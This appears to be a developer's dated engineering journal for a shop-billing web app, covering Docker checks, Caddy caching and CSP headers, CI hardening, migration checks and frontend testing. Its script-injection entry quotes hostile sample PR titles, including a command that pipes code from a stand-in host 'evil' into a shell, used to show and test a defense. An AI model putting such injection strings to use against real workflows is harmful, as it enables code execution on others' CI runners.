  1. `main.ts` and `worker.ts` had no top-level `catch`. A startup failure printed a raw stack trace, and with the database down the worker crash-looped under `restart: unless-stopped`.
  2. `describeError` let Drizzle's `params:` (query values) into logs.
  3. My notes overstated the pg password fact.

  I also raised one of its minors: `pnpm dev` listened on every interface, so the API was reachable from the shop's Wi-Fi.

  Fixes, each test-first:
  - `runProcess()` wraps all three entry points (one messages-only line, exit 1);
  - `createWorker()` logs a warning when the database is unreachable instead of crashing (planted-error check; Docker: db stopped → worker up, 0 restarts);
  - `params:` is cut off;
  - a `HOST` setting defaults to `127.0.0.1`, with `0.0.0.0` set only inside the container.
- **Why / what I learned:** A rule ("log messages only") must cover the paths nobody thinks of, like a crash before the app's logger exists. A dependency outage at boot is normal on a server, so the service should wait, not crash-loop. Re-grade review findings by their effect: "Minor" Wi-Fi exposure broke a rule the project already applies to the database port.
- **Say it in an interview:** "Every process entry point runs inside one wrapper that turns any crash into a single sanitized log line and exit code 1. The worker tolerates the database being down at boot instead of crash-looping."
- **Follow-ups to expect:** Crash-and-restart vs wait-and-retry? (Crash-restart is fine for real corruption, but for a dependency that's simply not up yet it floods logs and hides the cause. Waiting with a warning says exactly what's wrong.)

### 2026-10-30 — Docker commands I used to check the stack, not just start it `#devops`
- **What happened:** "It started" proved little. These commands found or ruled out real problems:
  - `docker compose ps -a`: shows one-shot containers too (`migrate Exited (0)` is success).
  - `docker inspect <container> --format '{{.RestartCount}}'`: a restart count of 1 exposed the dying worker.
  - `docker compose logs <service> --no-log-prefix`: the "unsettled top-level await" warning was there.
  - `docker run --rm <image> sh -c 'id; ls -a /app; env'`: non-root user, no `.env`, no secret variables.
  - `docker history --no-trunc <image>`: every build instruction, where a leaked `ARG`/`ENV` would show.
  - `docker compose run --rm --no-deps -e VAR=... migrate`: a one-off run with one setting changed (the wrong-password check).
  - `docker stop`/`docker start` on single containers: `docker compose start` can start a service's dependencies too, which once hid the "database down at startup" case.
- **Why / what I learned:** Check the state you care about (restart counts, exit codes, image contents), not the command's success message.
- **Say it in an interview:** "After bringing the stack up, I check restart counts and exit codes, look inside the image for secrets with `docker history`, and stop the database on purpose to see how the services behave."
- **Follow-ups to expect:** How would you see why a container keeps restarting? (`docker compose ps -a` for the exit code, `docker logs` for the last lines, `docker inspect` for the restart count and the OOM-killed flag.)

### 2026-10-30 — Hinglish as a third interface language `#product` `#frontend`
- **What happened:** At the start of P0.5 I added Hinglish (Hindi written in English letters, "Bill banao") next to English and Hindi. Many shopkeepers read Hindi but type and text in Latin letters. Recorded in Module 00 #25 and NFR 7 with change-log lines.
- **Why / what I learned:** A language is not just a translation, it's also a script. Hinglish gets its own standard tag, `hi-Latn` (BCP 47: language `hi`, script `Latn`), so the browser and screen readers know what they're reading.
- **Say it in an interview:** "The app runs in English, Hindi and Hinglish. Hinglish is tagged `hi-Latn`, the standard code for Hindi in Latin script, and tests check that the Hindi file is in Devanagari and the Hinglish one never is."
- **Follow-ups to expect:** Why not just transliterate Hindi automatically? (Hinglish isn't letter-by-letter transliteration: people write "Connected hai", mixing English words in. It has to be written by hand.)

### 2026-10-30 — Web app served by Caddy, same as production `#frontend` `#devops` → ADR 0023
- **What happened:** The web app is a two-stage Docker image: Node builds the static files, then a small Caddy image serves them and passes `/api/*` to the `api` container. Locally Vite's dev server does the same `/api` proxying.
- **Why / what I learned:**
  - Running the real web server locally tests the routing, headers and fallback before the cloud exists.
  - One origin for page and API means cookies work and there's no CORS. The browser needs no configuration, so there's no `VITE_` variable that could leak a secret.
  - Caching: Vite puts a content hash in file names, so `/assets/*` can be cached for a year (`immutable`), while `index.html` is `no-cache` so a new deploy shows up on the next load.
  - The SPA fallback (any unknown path → `index.html`) must not cover `/assets/*`. Otherwise an old tab asking for a deleted chunk gets HTML, cached for a year under a script's name.
  - A strict Content-Security-Policy (`default-src 'self'`) is free while the app loads only its own files, and blocks injected scripts.
- **Say it in an interview:** "Caddy serves the built files and reverse-proxies `/api`, so the browser sees one origin. Hashed assets are cached forever, `index.html` never, and missing assets are a real 404 so the SPA fallback can't poison the cache. A strict CSP blocks scripts from anywhere else."
- **Follow-ups to expect:** What is a reverse proxy? (A server that takes the browser's request and forwards it to another server, here the API, returning its answer as if it were its own.) Why not `vite preview`? (Vite says it's not a production server.)

### 2026-10-30 — PowerShell added a BOM to package.json and broke Vitest `#gotcha` `#tooling`
- **What happened:** I changed the root `package.json` with PowerShell 5.1's `Set-Content -Encoding utf8`, which writes a byte-order mark (BOM, three invisible bytes) at the start. Vitest then failed with "Unexpected token" while reading the file as JSON, and printed a misleading "Cannot find dependency 'jsdom'". `Add-Content` also gave `.prettierignore` Windows line endings.
- **Why / what I learned:** The error you see first isn't always the cause: the real error was above it, in Node's JSON parser. In PowerShell 5.1, "utf8" means "UTF-8 with BOM". Edit files with the editor tools, or with .NET's `UTF8Encoding($false)` (no BOM) when a script must write them.
- **Say it in an interview:** "A test run failed with 'missing dependency', but reading the whole output showed a JSON parse error: a script had written a BOM into package.json. I fixed the file and stopped editing files through PowerShell."
- **Follow-ups to expect:** What is a BOM? (A marker at the start of a text file saying which Unicode encoding it uses. UTF-8 doesn't need one, and JSON parsers reject it.)

### 2026-10-30 — An i18next default would have shown Hinglish users Devanagari `#frontend` `#gotcha` `#testing`
- **What happened:** For a language like `hi-Latn`, i18next by default looks for a missing string in `hi-Latn`, then `hi`, then the fallback `en`. So a Hinglish user would have seen Hindi in Devanagari whenever a Hinglish string was missing. `load: 'currentOnly'` skips the `hi` step. I wrote a test that adds a string to English and Hindi only and expects English in Hinglish, then removed the setting to watch the test fail ("expected 'हिन्दी में' to be 'In English'").
- **Why / what I learned:** Library defaults are designed for regional variants (`en-GB` → `en`), not for a different script. A test should be seen failing before it's trusted.
- **Say it in an interview:** "I found that i18next's fallback chain would show Hinglish users Devanagari, pinned it with `load: 'currentOnly'`, and proved the test catches it by removing the setting."
- **Follow-ups to expect:** How do you stop missing translations in the first place? (A test compares every language file's keys with English, and `t()` keys are type-checked against `en.json`.)

### 2026-10-30 — Two lint plugins that didn't fit out of the box `#tooling` `#frontend`
- **What happened:**
  - `eslint-plugin-jsx-a11y` (accessibility rules) declares support only up to ESLint 9, and we run 10. I planted a missing `alt` on an `<img>` and a hook inside an `if`; both were caught, so it works despite the warning.
  - `eslint-plugin-react-refresh` flagged every TanStack route file, because they export a `Route` object and keep their components private. TanStack's plugin moves those components into their own modules, which is where fast refresh happens, so I turned the rule off for `src/routes/` only, with a comment saying why.
- **Why / what I learned:** A peer-dependency warning means "not promised", not "broken": test it. Turn a rule off as narrowly as possible, and write down the reason.
- **Say it in an interview:** "When a plugin officially didn't support our ESLint version, I proved it worked by planting errors it had to catch, instead of trusting or ignoring the warning."
- **Follow-ups to expect:** What is fast refresh? (Vite swaps a changed React component in the running page without a reload, keeping its state. It only works when a file exports nothing but components.)

### 2026-10-30 — A 404 that said "cache me for a year" `#devops` `#gotcha` `#security` → ADR 0023
- **What happened:** The first `curl -I` check of the Caddy container showed that `/assets/missing.js` answered 404 with `Cache-Control: public, max-age=31536000, immutable`, without the CSP and with `Server: Caddy`. The `header` directives had run before the file server failed, and Caddy's error handling starts a fresh response. Fix: set the long cache only when the file exists (`@exists file`), and answer errors in `handle_errors`, which sets the security headers again plus `Cache-Control: no-store`. A stopped API now gives a clean `502` with the same headers.
- **Why / what I learned:** Browsers may cache a 404 if the headers allow it. Error responses need their own headers, and the only way to know is to look at the real response, not the config.
- **Say it in an interview:** "Checking the real headers with curl, I found my 404s carried the one-year immutable cache and lost the security headers, because the web server's error path builds a new response. Errors now get no-store and the same security headers."
- **Follow-ups to expect:** What does `immutable` add to `max-age`? (It tells the browser not to re-check the file even on reload, which is safe only because the file name changes whenever its content does.)

### 2026-10-30 — Checking the app in a real browser without a browser extension `#testing` `#tooling`
- **What happened:** The Chrome extension disconnected, so I used Chrome itself in headless mode. `chrome --headless --dump-dom` prints the page after its JavaScript has run. A 60-line Node script drove Chrome over the DevTools protocol (the same protocol Playwright uses), with Node 24's built-in WebSocket. It clicked each language, took screenshots, reloaded to check the choice was kept, and collected console errors and CSP violations: none. With the database stopped the badge said "Server is up, but data can't be loaded", with the API stopped "Can't reach the server", and both went back to "Connected".
- **Why / what I learned:** Unit tests ran in jsdom, which has no CSP and no real network. Only a real browser proves the strict CSP doesn't break the built app.
- **Say it in an interview:** "Component tests run in jsdom, but I also loaded the production build in headless Chrome through Caddy, to prove the strict CSP and the `/api` proxy work and the status badge reacts when I stop the database or the API."
- **Follow-ups to expect:** What is the Chrome DevTools Protocol? (The JSON-over-WebSocket interface Chrome's DevTools use. Puppeteer and Playwright are built on it.)

### 2026-10-30 — Two 5-second timeouts racing each other `#bug` `#frontend` `#backend`
- **What happened:** The fresh review stopped the database and loaded the page five times. Twice the badge said "Can't reach the server" instead of "Server is up, but data can't be loaded". The API waits up to 5 s for a database connection before answering 503 (`connectionTimeoutMillis` in `packages/db`), and the browser also gave up at exactly 5 s. Whichever finished first won. I measured it (`curl -w %{time_total}`: 5.005 s, 5.004 s, 3.13 s…), raised the browser's timeout to 10 s, added a test that pins "browser timeout ≥ 2 × the API's database timeout", and re-ran: 6 of 6 correct.
- **Why / what I learned:** When one timeout sits inside another, the outer one must be clearly longer, or the error you report depends on luck. My own check had passed once by chance, and the reviewer repeated it. A check that can race must be run more than once.
- **Say it in an interview:** "A status badge sometimes showed the wrong outage because the browser's 5-second timeout raced the API's 5-second database timeout. I made the outer timeout twice the inner one and pinned that with a test."
- **Follow-ups to expect:** How would you set timeouts across layers? (Each layer's timeout is shorter than the one calling it: database < API < browser < load balancer, so the innermost failure is the one reported.)

### 2026-10-30 — The rest of the P0.5 review, and how I checked each fix `#process` `#security` `#devops`
- **What happened:** Besides the timeout race, the fresh reviewer found:
  - Express's `X-Powered-By` header reaching the browser. Removed with `app.disable('x-powered-by')`, with a test.
  - `/api` without a slash getting the app's HTML. Fixed with a named matcher `@api path /api /api/*`. My first try, `handle /api /api/*`, failed the image build, because `caddy validate` runs in the Dockerfile and `handle` takes one matcher only.
  - TanStack Router's own English error screen replacing the whole app when a page's code can't be downloaded. Replaced with a translated `defaultErrorComponent`.

  Left for later: `/favicon.ico` gets HTML until P0.7 adds an icon, and a redirect on an asset URL carries the long cache header (harmless).
- **Commands that proved things:**
  - `curl -s -o NUL -w "%{http_code} %{time_total}s"`: response time, which exposed the 5.00 s race.
  - `curl -s -D - -o NUL <url>`: only the headers, for GET requests.
  - `docker compose exec -u root web mv /srv/assets/<chunk> /tmp/`: simulate a missing chunk inside the running container, then move it back.
  - `chrome --headless=new --dump-dom --virtual-time-budget=15000 <url>`: the page after its JavaScript has run, repeated in a loop to catch flaky results.
- **Why / what I learned:** Validating config at build time turns a broken web server into a failed build instead of a broken deploy. A fault can be simulated in a running container without changing the image.
- **Say it in an interview:** "My Dockerfile runs `caddy validate`, so a bad web-server config fails the build, not the deploy. To test the error screen I removed a JavaScript chunk from the running container and loaded the page in headless Chrome."
- **Follow-ups to expect:** Why hide `X-Powered-By`? (It's not a vulnerability itself, but it tells attackers which framework's known bugs to try. It costs nothing to remove.)

### 2026-10-31 — DevOps stage 3: CI with five required checks `#devops` `#github` → ADR 0024
- **What happened:** I added GitHub Actions. `ci.yml` runs four jobs in parallel on Ubuntu: `check` (format, lint, types, all tests, build, actionlint), `secrets` (gitleaks over the whole history), `migrations` (a new migration must be newer than `main`'s) and `smoke` (build both images, `docker compose up --wait`, then `scripts/ci/smoke.sh`). `pr-title.yml` checks the title. All five are required in the `protect-main` ruleset. Everything passed on the first run, including the Testcontainers integration tests and the stop-signal checks that Windows can't run.
- **Why / what I learned:** CI is a clean machine that doesn't share my laptop's leftovers, so "works on my machine" becomes "works". Logic longer than a line lives in scripts I can run locally, so a red build is reproducible. `pr-title` is a separate workflow because renaming a PR (`edited`) shouldn't re-run, or cancel, the whole build.
- **Say it in an interview:** "Every PR runs five required checks, including a smoke test that boots the real images with Compose and checks headers, a failing migration and clean shutdowns. Each check is a script I can also run locally."
- **Follow-ups to expect:** Why not Jenkins? (It needs a server to run, pay for and patch; ADR 0012.) Why Testcontainers instead of a `services:` database? (Same setup as the laptop, including the roles bootstrap script.)

### 2026-10-31 — Securing the workflows: SHA pins, read-only token, no secrets `#security` `#devops` → ADR 0024
- **What happened:** Every action is pinned to a 40-character commit SHA with the version in a comment. Dependabot opens one grouped PR a month to update them. It can't see the Docker images I run inside `run:` steps (gitleaks, actionlint), so those are bumped by hand. The workflow token is `contents: read`, checkout doesn't keep the token (`persist-credentials: false`), and CI uses no secrets at all: the smoke test copies `.env.example`'s fake passwords for a throwaway database.
- **Why / what I learned:** In March 2025, attackers moved the tags of `tj-actions/changed-files` to code that printed CI secrets into public logs. Anyone using a version tag ran it; anyone pinned to a SHA didn't. A tag is a movable pointer, a SHA isn't.
- **Say it in an interview:** "I pin actions to commit SHAs because tags can be repointed, as the tj-actions attack showed, and Dependabot keeps the pins fresh. My CI has a read-only token and no secrets, so a hijacked step has nothing to steal."
- **Follow-ups to expect:** What's `pull_request_target` and why avoid it? (It runs with the base repo's token and secrets; checking out the PR's code there runs a stranger's code with your rights.)

### 2026-10-31 — Script injection: a PR title is code if you let it be `#security` `#gotcha`
- **What happened:** The PR-title check reads the title from `env: PR_TITLE: ${{ github.event.pull_request.title }}`, never from `${{ }}` written inside `run:`. I tested the script with a title made of `$(touch /tmp/pwned)`, the same in backticks, and quotes: it was rejected as text and no file appeared.
- **Why / what I learned:** GitHub replaces `${{ }}` before the shell starts, so a title written straight into a script becomes part of the script. Through `env:`, the shell only ever sees it as a variable's value. The bash regex is also kept in a variable, and the title is never `eval`ed.
- **Say it in an interview:** "Anyone can name a pull request `$(curl evil | sh)`. If a workflow pastes the title into a shell script with `${{ }}`, that runs. I pass it through an environment variable, so it's only ever data."
- **Follow-ups to expect:** Which other fields are risky? (Anything a user types: issue and PR titles and bodies, branch names, commit messages, comment text.)

### 2026-10-31 — Proving each check can fail, without polluting history `#testing` `#git` `#process`
- **What happened:** A check that has never failed proves nothing, so I broke each one on purpose: a badly formatted line (`check`), a fake API key (`secrets`, which printed it as `REDACTED`), a wrong expected header (`smoke`, which then printed every container's logs), and a PR renamed to `CI: Add workflows.` (`pr-title`). The first three went on a throwaway branch, run with `gh workflow run ci.yml --ref <branch>`, which I then deleted. The migration check's failure was shown locally with a hand-edited journal.
- **Why / what I learned:** Committing the fake key to the PR branch and reverting it wouldn't have worked: a revert adds a commit, the key stays in history, and every later full-history gitleaks scan would fail. Removing it would need a force-push, which the project forbids.
- **Say it in an interview:** "I proved each CI check could go red by planting a failure for it. I put the fake secret on a throwaway branch, because a revert doesn't remove it from history and the secrets scan reads the whole history."
- **Follow-ups to expect:** How would you silence a known false positive in gitleaks? (A `.gitleaksignore` entry with the finding's fingerprint, reviewed like code.)

### 2026-10-31 — The Docker layer cache in CI: measure it `#devops` `#gotcha` `#cost`
- **What happened:** The smoke job builds the images with `docker/build-push-action` and the GitHub Actions cache (`type=gha`, `mode=max`). First run, empty cache: 2 min 47 s. A re-run of the same commit: 50 s, with every layer `CACHED`. On the throwaway branch, though, nothing was cached, and exporting the cache took 73 s while the `pnpm install` it saves took only 6 s.
- **Why / what I learned:** GitHub's cache is scoped by branch: a run can read its own branch's cache and `main`'s, never a sibling branch's. So PRs benefit once `main` has a cache. On GitHub's fast network the install that took 12 minutes on my laptop takes 6 s, so the cache's real win is skipping the TypeScript and Vite builds and the image export, not the download. `mode=max` is needed to cache the build stage, not just the final image.
- **Say it in an interview:** "I measured my CI cache instead of assuming: cold 2 min 47 s, warm 50 s. I also found GitHub scopes caches by branch, so a new branch only gets `main`'s cache."
- **Follow-ups to expect:** Why are Dockerfile layers ordered manifests-first? (The install layer is reused until a dependency changes; only the source-copy layers rebuild on a code change.)

### 2026-10-31 — Required checks: up to date with `main`, and only from GitHub Actions `#github` `#security` → ADR 0024
- **What happened:** I added a `required_status_checks` rule to `protect-main` with `gh api --method PUT`, sending the existing ruleset plus the new rule, after saving a copy of the old JSON. Each check is bound to the GitHub Actions app (id 15368), and *Require branches to be up to date* is on.
- **Why / what I learned:** Without the app binding, any integration with status-write access could post a green `check`. Without "up to date", the `migrations` check could have run against an older `main`. If `main` gains a migration afterwards, the PR's green check is stale, which is exactly Drizzle's skip trap. Required checks can only be picked once they've run at least once, so GitHub knows their names.
- **Say it in an interview:** "My required checks must come from GitHub Actions and run against the latest `main`. That second rule matters because my migration-order check is only meaningful against the current `main`."
- **Follow-ups to expect:** What's the cost of "up to date"? (When `main` moves, every open PR needs an update and a re-run; fine for a solo project, and merge queues solve it for big teams.)

### 2026-10-31 — My own last PR title would have failed the new check `#git` `#mistake`
- **What happened:** Before turning the PR-title check on, I ran it against every title already on `main`. P0.5's, `chore: build the react web skeleton with caddy and three languages (P0.5)`, has 73 characters, one over the 72 limit in my own git-workflow doc. Only the two titles from before the convention also failed.
- **Why / what I learned:** A written rule nobody checks drifts. Running a new check against past data shows whether the rule is realistic before it starts blocking people.
- **Say it in an interview:** "I back-tested my PR-title check against the existing history. It caught one of my own titles, one character too long, which showed why the rule needed automating."
- **Follow-ups to expect:** Why 72 characters? (Git tools and GitHub's UI truncate longer subject lines; 72 leaves room for indentation in `git log`.)

### 2026-10-31 — The P0.6 review: what my own checks let through `#process` `#database` `#devops`
- **What happened:** A fresh reviewer found nothing critical, but four things worth fixing before merge:
  - Dependabot titles its grouped PRs `ci: bump <action> from X to Y in the actions group`, up to 76 characters, so my 72-character rule would have turned every monthly update red. Fixed: the length rule is waived for `dependabot[bot]` only (author passed through `env:`, like the title).
  - The migration check only looked at new migrations. Editing, re-dating or deleting one that `main` already has passed, though databases that ran it would never see the edit, and a later timestamp would make Drizzle run it twice. Now it fails, with 3 new tests, and also catches an edited or deleted `.sql` file (`git diff --diff-filter=DM` against the merge base).
  - A `catch {}` returned "no migrations" for any error, so a corrupt base journal would have passed. Now only a missing journal means "none"; bad JSON fails the check.
  - `if: failure()` doesn't fire when a job hits its timeout, because GitHub cancels it instead. The logs step is now `failure() || cancelled()`, and `docker compose up --wait` has `--wait-timeout 180`.

  Two doc claims were also wrong. Dependabot doesn't update Docker images run inside `run:`, and "runs on main always finish" isn't true: a queued run can be replaced.
- **Why / what I learned:** A check is only as good as the inputs I imagined. The reviewer thought of the bot's titles, edits to old migrations, and a timeout instead of a failure. A catch-all `catch` in a safety check makes it fail open.
- **Say it in an interview:** "Review found my migration check only looked at new files, so editing an applied migration would have passed and silently drifted production's schema. I extended it to fail on any change to a migration main already has."
- **Follow-ups to expect:** Why can't you just edit a migration that has run? (Drizzle records it as applied and never runs it again, so existing databases keep the old version while fresh ones get the new one. Fix forward with a new migration.)

### 2026-10-31 — `gh` commands for driving CI from the terminal `#devops` `#github` `#tooling`
- **What happened:** I ran and debugged the whole P0.6 pipeline without opening the browser:
  - `gh pr checks 6 --watch`: wait for a PR's checks, then print each result.
  - `gh run view <id> --log-failed`: only the failed steps' logs. A run's logs only become available once the whole run has finished.
  - `gh api --allow-escape-sequences repos/<owner>/<repo>/actions/jobs/<job>/logs`: one job's full log, including BuildKit's `CACHED` lines.
  - `gh workflow run ci.yml --ref <branch>`: start a run by hand on any branch (the `workflow_dispatch` trigger).
  - `gh run rerun <id> --job <job-id>`: re-run one job, e.g. to measure a warm cache.
  - `gh api --method PUT repos/<owner>/<repo>/rulesets/<id> --input ruleset.json`: replace a ruleset. Send all the existing rules plus the new one, after saving the old JSON.
  - `gh api repos/<owner>/<repo>/actions/permissions/workflow`: confirm the default token is read-only.
- **Why / what I learned:** The API shows the real state, so I can check a setting instead of trusting a screenshot. A ruleset `PUT` replaces the whole rule list, so leaving out an existing rule deletes it.
- **Say it in an interview:** "I drove CI from the GitHub CLI: watched checks, pulled only the failed logs, re-ran single jobs to measure caching, and changed branch rules through the API after backing up the old JSON."
- **Follow-ups to expect:** PUT vs PATCH? (PUT replaces the whole resource, PATCH changes the fields you send. GitHub's ruleset update is a PUT, so you send everything.)

### 2026-10-31 — `edited` fires on a description edit too `#github` `#gotcha`
- **What happened:** After I updated PR #6's description, the PR briefly showed "blocked". The `pull_request` `edited` event, which I used so a rename re-runs `pr-title`, also fires when the description or base branch changes. `pr-title` re-ran (5 s), and the required check was pending until it finished.
- **Why / what I learned:** An event name can cover more than the case you added it for. Here it's harmless, and the reason `pr-title` is its own tiny workflow: a description edit doesn't rebuild everything.
- **Say it in an interview:** "My PR-title check listens to `edited` so a rename re-runs it. That event also fires on description edits, which is why it's a separate five-second workflow and not part of the main build."
- **Follow-ups to expect:** How would you run only on title changes? (Compare `github.event.changes.title` in an `if:`, but the check must still report on every new commit, so keep `synchronize`.)

### 2026-10-31 — A design system starts from constraints, not taste `#frontend` `#process`
- **What happened:** Before picking colours for P0.7, I listed what the product already forces on the design: a counter computer with keyboard and scanner (no phones), screens dense with bills and stock, three languages including Devanagari, and a CSP that allows files only from our own origin.
- **Why / what I learned:** These rule things out before taste comes in. The CSP means fonts and icons must be bundled with the app, not loaded from Google Fonts. Devanagari has taller letters and marks above and below the line, so line heights and fixed-height boxes must leave room for it. Billing by keyboard means every action needs a shortcut and a visible focus. Treated as a feature, the design work is split into questions, approaches, an approved spec, then a plan.
- **Say it in an interview:** "I designed the UI from the constraints first: a keyboard-only billing counter, Hindi as well as English, and a strict Content Security Policy. That decided fonts, spacing and focus styles before we argued about colours."
- **Follow-ups to expect:** Why not load fonts from a CDN? (The CSP's `font-src 'self'` blocks it, and self-hosting avoids a third-party request and works the same on every network.) What changes for Devanagari? (A font with real Devanagari support, larger line height, and no clipped fixed-height boxes; test every screen in all three languages.)

### 2026-10-31 — The owner picked the look from mockups in the browser `#frontend` `#process` → ADR 0025
- **What happened:** Instead of describing colours in words, I showed three full dashboard mockups (Apple-clean, warm paper, calm slate) in light and dark, then corner radii (10/8/6 px) and three fonts (Inter, IBM Plex, Mukta) with real Hindi, money and look-alike characters. The owner chose Apple-clean, 8 px and IBM Plex in a few minutes.
- **Why / what I learned:** People choose visuals far better by seeing them than by reading about them. Each screen asked one question, so the answers were clear and became the spec.
- **Say it in an interview:** "I didn't guess the design: I showed the shop owner mockups side by side, one decision per screen, and wrote their choices into a spec before any code."
- **Follow-ups to expect:** Why IBM Plex? (One family designed for both Latin and Devanagari, so Hindi matches English, and very clear digits for bills.)

### 2026-10-31 — The contrast test rejected two colours the owner had approved `#frontend` `#testing` → ADR 0025
- **What happened:** The first run of the readability test failed two colours from the approved table: blue link text on the grey page (4.31:1) and green text on its pale green badge (4.48:1). WCAG AA needs 4.5:1. I switched links to `#0066cc` (apple.com's own link blue) and the green to `#1b7a42`; buttons kept `#0071e3`, which passes with white text.
- **Why / what I learned:** Both colours looked fine by eye. A goal like "easy to read" only stays true if a test turns it into a number.
- **Say it in an interview:** "Readability was the top requirement, so I made it a test over the design tokens. It caught two failing colours on day one, before any screen used them."
- **Follow-ups to expect:** What is a contrast ratio? (Relative luminance of the lighter colour plus 0.05, divided by the darker plus 0.05; 1:1 to 21:1.)

### 2026-10-31 — Vitest blanks CSS files, even `?raw` imports `#testing` `#gotcha`
- **What happened:** The contrast test imported `styles.css?raw` and got an empty string, so every pair "was missing", and the "light and dark have the same tokens" test passed by comparing two empty lists.
- **Why / what I learned:** Vitest skips CSS processing by default (`css.include` is empty), raw imports included. I opted `src/styles.css` in, and added a guard test that fails if no tokens are found, so an empty read can never pass silently again.
- **Say it in an interview:** "A test that compares two empty things passes. I added a guard that the input is really there."
- **Follow-ups to expect:** Why not read the file with `fs`? (The web app has no Node types, and shouldn't: they'd let browser code use Node APIs by mistake.)

### 2026-10-31 — The production build broke a page the tests passed `#frontend` `#mistake` `#gotcha`
- **What happened:** On the real build through Caddy, `/design` showed NaN for every contrast ratio. The CSS minifier rewrites `#ffffff` as `#fff` and `#0066cc` as `#06c`, and my contrast function only read six-digit hex. Unit tests read the source CSS, so they never saw it.
- **Why / what I learned:** Fixed test-first (a short-hex test that failed, then passed). The real-app pass in a browser is not optional; the shipped artefact differs from the source.
- **Say it in an interview:** "My tests passed, but the minified build rewrote colours to short hex and broke the page. I only found it because I checked the real build in a browser, then added a test for it."
- **Follow-ups to expect:** What else does a build change? (File names get content hashes, dead code is removed, CSS and JS are minified.)

### 2026-10-31 — Dark mode without a white flash, inside a strict CSP `#frontend` `#security` → ADR 0025
- **What happened:** If React applied the saved theme, dark-mode users would see a white page for a moment on every load. A tiny script in `<head>` sets the `dark` class before anything is drawn. Inline scripts are blocked by `script-src 'self'`, so it's an external file, `public/theme-init.js`, and a test runs the real file.
- **Why / what I learned:** Storage can throw (blocked site data), so every read is in `try/catch` and falls back to light.
- **Say it in an interview:** "I avoided the dark-mode flash with a blocking script in the head, served as a file so my CSP can keep forbidding inline scripts."
- **Follow-ups to expect:** Why not a CSP hash for an inline script? (Possible, but every edit changes the hash; a file needs no CSP change.)

### 2026-10-31 — Tailwind can't see class names built at runtime `#frontend` `#gotcha`
- **What happened:** The colour swatches first used `bg-${name}`. Tailwind generates only the classes it finds written out in the source, so those swatches would have had no colour. I switched to a map of full class names (`bg-surface`, …).
- **Why / what I learned:** Tailwind scans files as text; it never runs the code.
- **Say it in an interview:** "Tailwind needs complete class names in the source; I keep a lookup table instead of building names with template strings."
- **Follow-ups to expect:** Another way? (List the classes for Tailwind explicitly, a "safelist".)

### 2026-10-31 — Keyboard shortcuts built for a barcode scanner `#frontend` → ADR 0026
- **What happened:** I wrote a small shortcut registry instead of using a library. The rules: in text fields only F-keys, Esc and Ctrl/Alt combos fire (the scanner types there); letters match the physical key, so Alt+H works on a Hindi layout where the key types "ह"; modifiers must match exactly, so AltGr (Ctrl+Alt) isn't Alt; held keys (`repeat`) and IME composition never fire; the browser's own keys are refused; a clash throws. `?` lists the active shortcuts.
- **Why / what I learned:** React StrictMode mounts, unmounts and remounts every component in development, so registering in an effect must clean up exactly, or it reports a false clash; there's a test for it.
- **Say it in an interview:** "Scanners type like keyboards, so shortcut design is a correctness problem at a billing counter, not just convenience. Every rule has a test."
- **Follow-ups to expect:** `event.key` vs `event.code`? (`key` is the character typed, `code` the physical key.)

### 2026-10-31 — Native `<dialog>` instead of Radix Dialog, because of the CSP `#frontend` `#security` → ADR 0026
- **What happened:** Radix Dialog's scroll lock inserts a `<style>` element at runtime, which `style-src 'self'` blocks. The browser's `<dialog>` with `showModal()` handles focus, closes on Escape, makes the page behind inert and styles its backdrop with `::backdrop`, all in plain CSS. jsdom doesn't implement `showModal`, so the test setup polyfills it.
- **Why / what I learned:** Setting a style from JavaScript (`element.style.x = …`, as Radix Tooltip does) is allowed by the CSP; adding a `<style>` tag or a `style="…"` attribute in HTML isn't. Checked in Chrome: no violations.
- **Say it in an interview:** "I kept my CSP strict by using the browser's own dialog element, which also gave me accessibility for free."
- **Follow-ups to expect:** What would `'unsafe-inline'` for styles risk? (Injected CSS can leak data, e.g. through attribute selectors that load background images, and can restyle the page to trick users.)

### 2026-10-31 — Small gotchas in P0.7 `#gotcha`
- **What happened:**
  - `:lang(hi)` also matches Hinglish (`hi-Latn`); Hindi's extra line height uses `html[lang='hi']`.
  - tailwind-merge didn't know our custom text sizes and treated `text-body` and `text-muted` as the same kind, dropping one; `extendTailwindMerge` fixed it.
  - React's fast-refresh lint rule forbids hooks and components in one file, so the shortcut hooks have their own file.
  - Resizing the browser window to 1024 px didn't change the page width (Windows display scaling), so I checked overflow by constraining the page width instead.
  - In Git Bash, a bare `cat > file` before a heredoc waited on input forever, and a long inline Python heredoc broke on its quotes; scripts go in a scratchpad file.
- **Why / what I learned:** Each cost minutes, not hours, because I read the actual output.
- **Say it in an interview:** "Small tooling details matter: I read the failing output, not the summary."
- **Follow-ups to expect:** —

### 2026-10-31 — The final review found three things my tests and my eyes missed `#frontend` `#testing` `#process`
- **What happened:** A fresh reviewer read the whole P0.7 branch and found:
  - **Grey on grey:** the unselected language names were `muted` text on the `surface-muted` switcher, 4.15:1. My contrast test only checked the pairs I had thought of. Added the pair, darkened the light grey to `#67676c`.
  - **Hindi spacing only half applied:** each Tailwind `text-*` class sets its own line height, so Hindi's 1.6 on `<body>` never reached buttons, labels or titles. Hindi now redefines every `--text-*--line-height` variable; checked in the built CSS and in Chrome (13 px → 20.8 px).
  - **A hidden feature:** `?` was the only way into the shortcut list, so mouse users would never find it, and on the Hindi Inscript layout Shift+/ types "य़", not "?". Added a sidebar button and matched `?` by its physical key too.
  Each fix started with a test that failed.
- **Why / what I learned:** A test only guards the cases it lists, and a style rule only works if nothing more specific overrides it. Ten minor findings went into PROGRESS under the tasks where they start to matter (P1.3, P1.13) instead of being fixed now.
- **Say it in an interview:** "A fresh review found that my readability test had a gap, that a CSS rule was being overridden by utility classes, and that a feature was only reachable by a key some keyboards can't type. I fixed each test-first and scheduled the minor findings against the tasks where they matter."
- **Follow-ups to expect:** Why not fix the minors too? (They don't affect anyone today; each is written down against the task where it becomes real, so the fix lands with its context and tests.)

### 2026-11-01 — Closed Phase 0 and wrote the 2-minute pitch `#process`
- **What happened:** Finished `phase-0.md` (status, a one-line summary, and a new "Looking back" section, now also in the journal template) and filled in the 2-minute pitch: problem → what makes it hard → architecture → one hard bug → how it's shipped → where it stands → what I'd do differently.
- **Why / what I learned:** A pitch has to say clearly what's built and what's planned, because an interviewer's follow-up will find the difference. So the AWS part is "next", not "deployed", and the pitch says to update those lines as phases finish. For the hard bug I chose the worker that died after 10 s: it has a clear clue (the exact number), a cause that tests Node knowledge (the event loop), and a fix proven by a test.
- **Say it in an interview:** "Phase 0 has no features on purpose: tenancy, permissions and CI are cheap to build first and expensive to retrofit."
- **Follow-ups to expect:** What would you cut if you had half the time? (The AI assistant and WhatsApp; billing, stock, udhaar and data safety are the core.)

